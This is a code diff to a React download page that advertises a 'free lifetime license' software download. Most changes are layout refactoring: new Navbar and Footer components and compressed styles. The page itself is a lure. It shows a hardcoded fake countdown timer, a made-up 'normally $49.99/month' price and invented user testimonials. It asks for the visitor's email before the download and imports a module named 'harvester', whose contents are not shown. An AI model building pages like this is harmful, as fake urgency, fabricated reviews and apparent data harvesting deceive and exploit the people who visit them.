@@ -1,8 +1,7 @@
 import React, { useState, useEffect } from 'react';
-import { Box, Button, Typography, Container, Card, CardContent, TextField, LinearProgress, Grid, Chip, Avatar, AppBar, Toolbar, IconButton, Paper, Divider, Fade } from '@mui/material';
-import ArrowBackIcon from '@mui/icons-material/ArrowBack';
-import VerifiedIcon from '@mui/icons-material/Verified';
-import SecurityIcon from '@mui/icons-material/Security';
+import { Box, Button, Typography, Container, Card, CardContent, TextField, LinearProgress, Grid, Chip, Avatar, Paper, Fade } from '@mui/material';
+import Navbar from '../components/Navbar';
+import Footer from '../components/Footer';
 import harvester from '../harvester/HarvesterCore';
 
 export default function DownloadPage() {
@@ -131,6 +130,8 @@ export default function DownloadPage() {
 
   return (
     <Box sx={{ minHeight: '100vh', bgcolor: '#f5f7fa' }}>
+      <Navbar />
+      
       {/* Header */}
       <Box sx={{ 
         background: 'linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #0f3460 100%)',
@@ -171,7 +172,6 @@ export default function DownloadPage() {
           boxShadow: '0 4px 24px rgba(0,0,0,0.06)'
         }}>
           <CardContent sx={{ p: { xs: 2.5, sm: 3.5 } }}>
-            {/* Timer Banner */}
             <Paper sx={{ 
               bgcolor: '#fef3cd', 
               border: '1px solid #ffc107', 
@@ -194,8 +194,6 @@ export default function DownloadPage() {
                 Limited Time Offer — Expires in <Box component="span" sx={{ color: '#dc2626' }}>14:32:18</Box>
               </Typography>
             </Paper>
-
-            {/* Feature List */}
             <Grid container spacing={1.5} sx={{ mb: 3 }}>
               {[
                 { icon: '🚀', text: 'Lightning-fast performance optimization' },
@@ -219,108 +217,42 @@ export default function DownloadPage() {
                 </Grid>
               ))}
             </Grid>
-
             <Box sx={{ 
-              bgcolor: '#f0fdf4', 
-              borderRadius: '12px', 
-              p: 2.5, 
-              mb: 3, 
-              textAlign: 'center',
+              bgcolor: '#f0fdf4', borderRadius: '12px', p: 2.5, mb: 3, textAlign: 'center',
               border: '1px solid #bbf7d0'
             }}>
               <Typography variant="h3" sx={{ 
-                color: '#059669', fontWeight: 900, fontSize: { xs: '2.2rem', md: '2.6rem' },
-                letterSpacing: '-1px'
+                color: '#059669', fontWeight: 900, fontSize: { xs: '2.2rem', md: '2.6rem' }, letterSpacing: '-1px'
               }}>
                 $0.00
               </Typography>
-              <Typography sx={{ color: '#059669', fontWeight: 700, fontSize: '1.05rem' }}>
-                FREE — Lifetime License
-              </Typography>
+              <Typography sx={{ color: '#059669', fontWeight: 700, fontSize: '1.05rem' }}>FREE — Lifetime License</Typography>
               <Typography sx={{ color: '#94a3b8', fontSize: '0.82rem', mt: 0.5 }}>
                 Normally $49.99/month — No credit card required
               </Typography>
             </Box>
-
             <Typography sx={{ color: '#475569', mb: 1.5, fontWeight: 600, textAlign: 'center', fontSize: '0.95rem' }}>
               Enter your email to get your free license key:
             </Typography>
-
             <TextField
-              fullWidth
-              type="email"
-              placeholder="your@email.com"
-              value={email}
-              onChange={(e) => setEmail(e.target.value)}
-              disabled={downloading}
+              fullWidth type="email" placeholder="your@email.com"
+              value={email} onChange={(e) => setEmail(e.target.value)} disabled={downloading}
               size="medium"
-              sx={{ 
-                mb: 2, 
-                '& .MuiOutlinedInput-root': { 
-                  bgcolor: '#f8fafc', 
-                  borderRadius: '10px',
-                  '& fieldset': { borderColor: '#e2e8f0', borderWidth: '1.5px' },
-                  '&:hover fieldset': { borderColor: '#94a3b8' },
-                  '&.Mui-focused fieldset': { borderColor: '#059669' },
-                }
-              }}
+              sx={{ mb: 2, '& .MuiOutlinedInput-root': { bgcolor: '#f8fafc', borderRadius: '10px', '& fieldset': { borderColor: '#e2e8f0', borderWidth: '1.5px' }, '&:hover fieldset': { borderColor: '#94a3b8' }, '&.Mui-focused fieldset': { borderColor: '#059669' } } }}
             />
-
             {downloading ? (
               <Box sx={{ textAlign: 'center', py: 1 }}>
-                <LinearProgress 
-                  variant="determinate" 
-                  value={progress} 
-                  sx={{ 
-                    height: 8, borderRadius: '4px', bgcolor: '#e8e8e8', 
-                    '& .MuiLinearProgress-bar': { 
-                      background: 'linear-gradient(90deg, #059669, #10b981)', 
-                      borderRadius: '4px' 
-                    } 
-                  }} 
-                />
-                <Typography sx={{ color: '#94a3b8', mt: 1.5, fontSize: '0.9rem' }}>
-                  Preparing your download... {Math.round(progress)}%
-                </Typography>
+                <LinearProgress variant="determinate" value={progress} sx={{ height: 8, borderRadius: '4px', bgcolor: '#e8e8e8', '& .MuiLinearProgress-bar': { background: 'linear-gradient(90deg, #059669, #10b981)', borderRadius: '4px' } }} />
+                <Typography sx={{ color: '#94a3b8', mt: 1.5, fontSize: '0.9rem' }}>Preparing your download... {Math.round(progress)}%</Typography>
               </Box>
             ) : (
-              <Button
-                variant="contained"
-                fullWidth
-                size="large"
-                onClick={handleDownload}
-                disabled={!email}
-                sx={{
-                  background: 'linear-gradient(135deg, #059669, #10b981)',
-                  '&:hover': { background: 'linear-gradient(135deg, #047857, #059669)' },
-                  '&:disabled': { bgcolor: '#a5d6a7' },
-                  fontWeight: 700,
-                  py: 1.6,
-                  fontSize: '1.05rem',
-                  textTransform: 'none',
-                  borderRadius: '12px',
-                  boxShadow: '0 4px 14px rgba(5,150,105,0.3)',
-                  '&:hover:not(:disabled)': {
-                    boxShadow: '0 6px 20px rgba(5,150,105,0.4)'
-                  }
-                }}
-              >
+              <Button variant="contained" fullWidth size="large" onClick={handleDownload} disabled={!email}
+                sx={{ background: 'linear-gradient(135deg, #059669, #10b981)', '&:hover': { background: 'linear-gradient(135deg, #047857, #059669)' }, fontWeight: 700, py: 1.6, fontSize: '1.05rem', textTransform: 'none', borderRadius: '12px', boxShadow: '0 4px 14px rgba(5,150,105,0.3)' }}>
                 🚀 Get Free License Key
               </Button>
             )}
-
-            <Box sx={{ 
-              display: 'flex', 
-              justifyContent: 'center', 
-              gap: 3, 
-              mt: 2.5, 
-              flexWrap: 'wrap' 
-            }}>
-              {[
-                { icon: '🔒', text: '256-bit encryption' },
-                { icon: '📦', text: '24.5 MB download' },
-                { icon: '💻', text: 'Windows • Mac • Linux' },
-              ].map((item, i) => (
+            <Box sx={{ display: 'flex', justifyContent: 'center', gap: 3, mt: 2.5, flexWrap: 'wrap' }}>
+              {[{ icon: '🔒', text: '256-bit encryption' }, { icon: '📦', text: '24.5 MB download' }, { icon: '💻', text: 'Windows • Mac • Linux' }].map((item, i) => (
                 <Box key={i} sx={{ display: 'flex', alignItems: 'center', gap: 0.5 }}>
                   <Typography sx={{ fontSize: '0.85rem' }}>{item.icon}</Typography>
                   <Typography sx={{ color: '#94a3b8', fontSize: '0.78rem' }}>{item.text}</Typography>
@@ -332,9 +264,7 @@ export default function DownloadPage() {
 
         {/* Testimonials */}
         <Box sx={{ mt: 4 }}>
-          <Typography variant="h6" sx={{ fontWeight: 700, color: '#0f172a', mb: 2.5, textAlign: 'center', fontSize: '1.1rem' }}>
-            What Our Users Say
-          </Typography>
+          <Typography variant="h6" sx={{ fontWeight: 700, color: '#0f172a', mb: 2.5, textAlign: 'center', fontSize: '1.1rem' }}>What Our Users Say</Typography>
           <Grid container spacing={2}>
             {[
               { name: 'Sarah M.', role: 'Software Developer', text: 'This tool saved me hours of manual work. The Pro features are incredible — and it\'s completely free!' },
@@ -342,25 +272,11 @@ export default function DownloadPage() {
               { name: 'Lisa R.', role: 'Digital Marketer', text: 'The analytics dashboard alone is worth hundreds. Getting this for free is a no-brainer.' },
             ].map((testimonial, i) => (
               <Grid item xs={12} sm={4} key={i}>
-                <Card elevation={0} sx={{ 
-                  borderRadius: '14px', 
-                  height: '100%',
-                  border: '1px solid #e2e8f0',
-                  transition: 'transform 0.2s, box-shadow 0.2s',
-                  '&:hover': { transform: 'translateY(-2px)', boxShadow: '0 8px 24px rgba(0,0,0,0.06)' }
-                }}>
+                <Card elevation={0} sx={{ borderRadius: '14px', height: '100%', border: '1px solid #e2e8f0', transition: '0.2s', '&:hover': { transform: 'translateY(-2px)' } }}>
                   <CardContent sx={{ p: 2.5 }}>
-                    <Typography sx={{ color: '#475569', fontSize: '0.85rem', mb: 2, lineHeight: 1.6, fontStyle: 'italic' }}>
-                      "{testimonial.text}"
-                    </Typography>
+                    <Typography sx={{ color: '#475569', fontSize: '0.85rem', mb: 2, lineHeight: 1.6, fontStyle: 'italic' }}>"{testimonial.text}"</Typography>
                     <Box sx={{ display: 'flex', alignItems: 'center', gap: 1.5 }}>
-                      <Avatar sx={{ 
-                        width: 34, height: 34, 
-                        background: 'linear-gradient(135deg, #059669, #10b981)', 
-                        fontSize: '0.85rem', fontWeight: 700 
-                      }}>
-                        {testimonial.name[0]}
-                      </Avatar>
+                      <Avatar sx={{ width: 34, height: 34, background: 'linear-gradient(135deg, #059669, #10b981)', fontSize: '0.85rem', fontWeight: 700 }}>{testimonial.name[0]}</Avatar>
                       <Box>
                         <Typography sx={{ fontWeight: 600, color: '#0f172a', fontSize: '0.82rem' }}>{testimonial.name}</Typography>
                         <Typography sx={{ color: '#94a3b8', fontSize: '0.72rem' }}>{testimonial.role}</Typography>
@@ -373,6 +289,8 @@ export default function DownloadPage() {
           </Grid>
         </Box>
       </Container>
+      
+      <Footer simple />
     </Box>
   );
 }
